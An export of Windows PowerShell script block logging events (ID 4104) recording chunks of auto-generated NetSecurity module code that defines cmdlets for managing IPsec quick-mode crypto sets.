    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecQuickModeCryptoSet' -Alias '*'
        

function Rename-NetIPsecQuickModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('PfsGroup')]
    [ValidateNotNull()]
    [Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup[]]
    ${PerfectForwardSecrecyGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -cont

ScriptBlock ID: c4a8740d-9bb5-4243-ac04-f86bbefea0d1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 6):
letization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Proposal')) {
            [object]$__cmdletization_value = ${Proposal}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PerfectForwardSecrecyGroup')) {
            [object]$__cmdletization_value = ${PerfectForwardSecrecyGroup}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PfsGroupID'; ParameterType = 'Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PfsGroupID'; ParameterType = 'Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecQuickModeCryptoSet' -Alias '*'
        

function Remove-NetIPsecQuickModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('PfsGroup')]
    [ValidateNotNull()]
    [Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup[]]
    ${PerfectForwardSecrecyGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }

ScriptBlock ID: c4a8740d-9bb5-4243-ac04-f86bbefea0d1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 6):
rue)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('PfsGroup')]
    [ValidateNotNull()]
    [Microsoft.Windows.Firewall.Commands.DiffieHellmanGroup[]]
    ${PerfectForwardSecrecyGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PerfectForwardSecrecyGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PerfectForwardSecrecyGroup})
        $__cmdletization_queryBuilder.FilterByProperty('PfsGroupID', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleQMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
